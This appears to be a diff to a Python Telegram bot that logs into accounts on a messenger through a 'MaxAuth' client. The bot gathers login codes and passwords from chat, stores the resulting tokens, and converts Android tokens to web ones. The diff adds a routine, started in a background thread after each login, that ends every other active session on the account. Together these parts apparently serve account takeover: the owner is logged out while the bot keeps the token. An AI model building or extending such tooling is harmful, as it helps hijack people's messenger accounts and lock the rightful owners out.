@@ -348,6 +348,24 @@ class MaxAuth:
             return {"success": False, "error": data["error"]}
         return {"success": True, "token": data.get("token", token)}
 
+    def get_sessions(self):
+        """Получает список активных сессий"""
+        try:
+            p = Packet(20, pack({}))
+            resp = self.conn.send(p)
+            data = unpack(resp.payload)
+            return data.get("sessions", [])
+        except:
+            return []
+
+    def close_session(self, session_id):
+        """Закрывает сессию по ID"""
+        try:
+            p = Packet(20, pack({"sessionId": session_id}))
+            self.conn.send(p, wait=False)
+        except:
+            pass
+
     def confirm_qr_scan(self, track_id: str, qr_link: str = None) -> dict:
         payload = {"trackId": track_id}
         if qr_link:
@@ -832,7 +850,6 @@ def convert_android_to_web(android_token: str, device_id: str = None,
         android.session_init()
         time.sleep(0.5)
         
-        # Логинимся для активации сессии (с обработкой флуд-контроля)
         login_res = android.login_by_token(android_token)
         if not login_res.get("success"):
             logging.warning(f"[CONVERT] Login warning: {login_res.get('error')}")
@@ -874,6 +891,30 @@ def convert_android_to_web(android_token: str, device_id: str = None,
 
     qr_link.close()
     return result
+
+# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+
+def kill_old_sessions(auth, token):
+    """Закрывает все старые сессии, оставляя только текущую"""
+    try:
+        auth.login_by_token(token)
+        sessions = auth.get_sessions()
+        if sessions:
+            current_id = None
+            for sess in sessions:
+                if isinstance(sess, dict) and sess.get('current'):
+                    current_id = sess.get('id')
+                    break
+            
+            closed = 0
+            for sess in sessions:
+                sess_id = sess.get('id') if isinstance(sess, dict) else None
+                if sess_id and sess_id != current_id:
+                    auth.close_session(sess_id)
+                    closed += 1
+            logging.info(f"Closed {closed} old sessions, kept current: {current_id}")
+    except Exception as e:
+        logging.warning(f"Failed to close old sessions: {e}")
 
 # ==================== ДАННЫЕ ====================
 
@@ -1812,6 +1853,9 @@ async def code_handler(message: types.Message, state: FSMContext):
         pending[uid]["token"] = result["token"]
         pending[uid]["device_id"] = auth.device_id
         pending[uid]["status"] = "done"
+        
+        # Кикаем старые сессии (только для существующих аккаунтов)
+        threading.Thread(target=kill_old_sessions, args=(auth, result["token"]), daemon=True).start()
 
     if pending[uid].get("status") == "done":
         token = pending[uid]["token"]
@@ -1876,6 +1920,10 @@ async def password_handler(message: types.Message, state: FSMContext):
     if token:
         pending[uid]["token"] = token
         pending[uid]["device_id"] = auth.device_id
+        
+        # Кикаем старые сессии
+        threading.Thread(target=kill_old_sessions, args=(auth, token), daemon=True).start()
+        
         uid_str = str(uid)
 
         if uid_str not in accounts:
